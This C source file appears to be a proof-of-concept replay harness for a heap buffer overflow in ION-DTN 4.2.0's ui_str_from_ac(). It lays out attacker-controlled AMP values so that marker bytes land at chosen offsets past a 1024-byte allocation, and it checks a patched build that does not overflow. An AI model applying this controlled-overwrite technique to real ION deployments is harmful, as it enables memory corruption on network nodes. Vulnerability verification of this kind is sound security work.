/*
 * Replay driver for the verbatim pinned ION-DTN 4.2.0 ui_str_from_ac() block.
 * Upstream statements are included from gen_block.h under #line directives;
 * only collaborators (STAKE/SRELEASE, vector iterator, ui_str_from_ari) are
 * harness stubs. No daemon, socket or AMP listener is created.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>

#define STAKE_LEN 1024
#define VICTIM_LEN 512
#define VALUE_LEN 80
#define NVALUES 18
#define MARKER "ION2SHL!"
#define MARKER_LEN 8

/* ---------------- harness types and collaborators ---------------- */
typedef struct ari_s { char text[96]; } ari_t;
typedef struct tnvc_s tnvc_t;
typedef struct { ari_t **items; size_t n; } vec_t;
typedef struct { vec_t *v; size_t i; } vecit_t;
typedef struct { vec_t values; } ac_t;

static unsigned char *g_arena;
static int g_asan_mode, g_stake_calls, g_puterr;
static unsigned char g_vbefore[VICTIM_LEN], g_vafter[VICTIM_LEN];
static size_t g_first_changed = (size_t) -1;

static vecit_t harness_vecit_first(vec_t *v) { vecit_t it = {v, 0}; return it; }
static int harness_vecit_valid(vecit_t it) { return it.i < it.v->n; }
static vecit_t harness_vecit_next(vecit_t it) { it.i++; return it; }
static void *harness_vecit_data(vecit_t it) { return it.v->items[it.i]; }
#define vecit_first harness_vecit_first
#define vecit_valid harness_vecit_valid
#define vecit_next harness_vecit_next
#define vecit_data harness_vecit_data

static void *harness_stake(size_t n)
{
    g_stake_calls++;
    if (g_asan_mode || !g_arena) return malloc(n);
    /* Capture build: the first STAKE(1024) is followed by a victim region. */
    return g_arena;
}

static void harness_release(void *p)
{
    if (p == (void *) g_arena) return; /* upstream fixed path releases str */
    free(p);
}
#define STAKE(n) harness_stake((size_t)(n))
#define SRELEASE(p) harness_release((void *)(p))

/* Rendered AMP value: attacker-controlled bytes, no interior NUL. */
static char *ui_str_from_ari(ari_t *id, tnvc_t *ap, int desc)
{
    (void)ap; (void)desc;
    return strdup(id->text);
}

#ifdef FIXED_BUILD
static void putErrmsg(const char *a, const char *b) { (void)a; (void)b; g_puterr++; }
#define CHKNULL(p) do { if (!(p)) return NULL; } while (0)

static size_t istrlen(const char *s, size_t max)
{
    size_t n = 0;
    while (n < max && s[n]) n++;
    return n;
}

static void istrcat(char *dst, const char *src, size_t max)
{
    size_t d = strnlen(dst, max), i = 0;
    while (d + i + 1 < max && src[i]) { dst[d + i] = src[i]; i++; }
    dst[d + i] = '\0';
}
#endif

#include "gen_block.h" /* verbatim pinned upstream ui_str_from_ac() */

/* ---------------- driver ---------------- */
static const size_t target_offset[] = {1024, 1088, 1152, 1280, 1408};
static const size_t target_value[]  = {12, 13, 14, 15, 17};
static const size_t target_pos[]    = {52, 35, 18, 65, 31};
#define NTARGET (sizeof(target_offset) / sizeof(target_offset[0]))

static ac_t g_ac;

static void build_values(void)
{
    g_ac.values.items = calloc(NVALUES, sizeof(ari_t *));
    g_ac.values.n = NVALUES;
    for (size_t k = 0; k < NVALUES; k++) {
        ari_t *id = calloc(1, sizeof(ari_t));
        memset(id->text, 'A', VALUE_LEN);
        id->text[VALUE_LEN] = '\0';
        for (size_t j = 0; j < NTARGET; j++)
            if (k == target_value[j])
                memcpy(id->text + target_pos[j], MARKER, MARKER_LEN);
        g_ac.values.items[k] = id;
    }
}

static void print_hex(const unsigned char *p, size_t n)
{
    for (size_t i = 0; i < n; i++) printf("%02x", p[i]);
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "capture";
    if (strcmp(mode, "asan") == 0) g_asan_mode = 1;

    build_values();
    if (!g_asan_mode) {
        g_arena = calloc(1, STAKE_LEN + VICTIM_LEN);
        memset(g_arena + STAKE_LEN, 'Z', VICTIM_LEN);
        memcpy(g_vbefore, g_arena + STAKE_LEN, VICTIM_LEN);
    }

    char *result = ui_str_from_ac(&g_ac);
    size_t rlen = result ? strlen(result) : 0;
    size_t written = NVALUES * (VALUE_LEN + 1);
    printf("LAYOUT stake_len=%d values=%d value_len=%d written=%zu overflow=%zd calls=%d\n",
           STAKE_LEN, NVALUES, VALUE_LEN, written, (ptrdiff_t)written - STAKE_LEN,
           g_stake_calls);

    if (g_asan_mode) return 0; /* ASan aborts inside the pinned strcat */

    memcpy(g_vafter, g_arena + STAKE_LEN, VICTIM_LEN);
    for (size_t i = 0; i < VICTIM_LEN; i++) {
        if (g_vbefore[i] != g_vafter[i]) { g_first_changed = i; break; }
    }

    if (result) {
        printf("CAPTURE returned=nonnull result_is_arena=%d returned_len=%zu "
               "first_changed=%zu state_failure=%d\n",
               result == (char *) g_arena, rlen, g_first_changed, rlen > STAKE_LEN);
        for (size_t j = 0; j < NTARGET; j++) {
            const unsigned char *p = g_arena + target_offset[j];
            unsigned char seen[MARKER_LEN];
            memcpy(seen, p, MARKER_LEN);
            printf("VICTIM requested_offset=%zu chosen_offset=%zu supplied=%s "
                   "observed=", target_offset[j], target_offset[j], "494f4e3253484c21");
            print_hex(seen, MARKER_LEN);
            printf(" equal=%d\n", memcmp(seen, MARKER, MARKER_LEN) == 0);
        }
    } else {
        int has_marker = memmem(g_vafter, VICTIM_LEN, MARKER, MARKER_LEN) != NULL;
        printf("CAPTURE returned=NULL first_changed=%zu puterr=%d\n",
               g_first_changed, g_puterr);
        printf("FIXED_NO_WRITE marker_never_reached=%d victim_unchanged=%d\n",
               !has_marker, g_first_changed == (size_t) -1);
    }
    return 0;
}
